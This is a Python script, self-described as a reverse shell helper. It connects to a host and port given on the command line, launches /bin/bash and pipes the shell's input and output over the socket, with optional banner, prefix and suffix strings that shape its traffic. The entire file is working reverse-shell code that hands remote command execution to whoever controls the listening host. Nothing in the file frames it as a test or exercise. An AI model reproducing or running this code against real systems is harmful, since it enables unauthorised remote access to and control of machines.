#!/usr/bin/env python
"""Reverse shell helper."""

import os
import queue
import socket
import sys
import time
import threading
from subprocess import PIPE
from subprocess import Popen
from subprocess import STDOUT


class IOCommand(object):
    """IOCommand instance."""

    def __init__(self, executable):
        self.proc = Popen(
            executable,
            stdin=PIPE,
            stdout=PIPE,
            stderr=STDOUT,
            bufsize=-1,
            shell=False,
            env=os.environ.copy(),
        )

    def output(self):
        """Command output."""
        while True:
            # BLOCKING call
            data = self.proc.stdout.read(1)
            print("Command Output: {}".format(repr(data)))
            yield data

    def input(self, data):
        """Command input."""
        self.proc.stdin.write(data)
        try:
            self.proc.stdin.flush()
        except IOError:
            pass


class IONetwork(object):
    """IONetwork instance."""

    def __init__(self, sock):
        self.sock = sock

    def recv(self):
        """Network receive."""
        while True:
            data = self.sock.recv(8192)
            if data:
                print("Network Received: {}".format(repr(data)))
            yield data

    def send(self, data, prefix1=None, prefix2=None, suffix1=None, suffix2=None):
        """Network send."""
        # Do we send a prefix before all command output?
        if prefix1 is not None:
            self.sock.send(prefix1)
        if prefix2 is not None:
            self.sock.send(prefix2)

        size = len(data)
        sent = 0
        while sent < size:
            sent += self.sock.send(data)

        # Do we send a suffx after all command output?
        if suffix1 is not None:
            self.sock.send(suffix1)
        if suffix2 is not None:
            self.sock.send(suffix2)
        return sent


def main(argv):
    """Main entrypoint."""
    host = argv[1]
    port = int(argv[2])
    banner = argv[3] if len(argv) > 3 and argv[3] else None
    prefix1 = argv[4] if len(argv) > 4 and argv[4] else None
    prefix2 = argv[5] if len(argv) > 5 and argv[5] else None
    suffix1 = argv[6] if len(argv) > 6 and argv[6] else None
    suffix2 = argv[7] if len(argv) > 7 and argv[7] else None

    print("Connecting to {}:{}".format(host, port))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("Connected to {}:{}".format(host, port))

    command = IOCommand("/bin/bash")
    network = IONetwork(s)

    def exec_cmd(producer, consumer):
        for data in producer():
            consumer(data)

    def add_queue(producer, q):
        for data in producer():
            q.put(data)

    # Send Banner?
    if banner is not None:
        banner = banner.replace("\\n", "\n")
        banner = banner.replace("\\r", "\r")
        try:
            banner = banner.encode("utf8")
        except UnicodeDecodeError:
            pass
        print("[MODE]: sending banner: {}".format(repr(banner)))
        s.sendall(banner)

    # Prepare prefix
    if prefix1 is not None:
        prefix1 = prefix1.replace("\\n", "\n")
        prefix1 = prefix1.replace("\\r", "\r")
        try:
            prefix1 = prefix1.encode("utf8")
        except UnicodeDecodeError:
            pass
        print("[MODE]: sending prefix1: {}".format(repr(prefix1)))
    if prefix2 is not None:
        prefix2 = prefix2.replace("\\n", "\n")
        prefix2 = prefix2.replace("\\r", "\r")
        try:
            prefix2 = prefix2.encode("utf8")
        except UnicodeDecodeError:
            pass
        print("[MODE]: sending prefix2: {}".format(repr(prefix2)))

    # Prepare suffix
    if suffix1 is not None:
        suffix1 = suffix1.replace("\\n", "\n")
        suffix1 = suffix1.replace("\\r", "\r")
        try:
            suffix1 = suffix1.encode("utf8")
        except UnicodeDecodeError:
            pass
        print("[MODE]: sending suffix1: {}".format(repr(suffix1)))
        s.send(suffix1)
    if suffix2 is not None:
        suffix2 = suffix2.replace("\\n", "\n")
        suffix2 = suffix2.replace("\\r", "\r")
        try:
            suffix2 = suffix2.encode("utf8")
        except UnicodeDecodeError:
            pass
        print("[MODE]: sending suffix2: {}".format(repr(suffix2)))
        s.send(suffix2)

    q = queue.Queue()
    t1 = threading.Thread(target=exec_cmd, args=(network.recv, command.input))
    t2 = threading.Thread(target=add_queue, args=(command.output, q))

    t1.daemon = True
    t2.daemon = True
    t1.start()
    t2.start()

    oldsize = 0
    newsize = 0
    data = []
    while True:
        newsize = q.qsize()
        if newsize > 0:
            # No new items added during this round
            if newsize == oldsize:
                # Fetch all items and send them at once
                while not q.empty():
                    data.append(q.get())
                network.send(b"".join(data), prefix1, prefix2, suffix1, suffix2)
                data = []
                # flush
        oldsize = newsize
        time.sleep(0.01)


if __name__ == "__main__":
    try:
        main(sys.argv)
    except KeyboardInterrupt:
        sys.exit(1)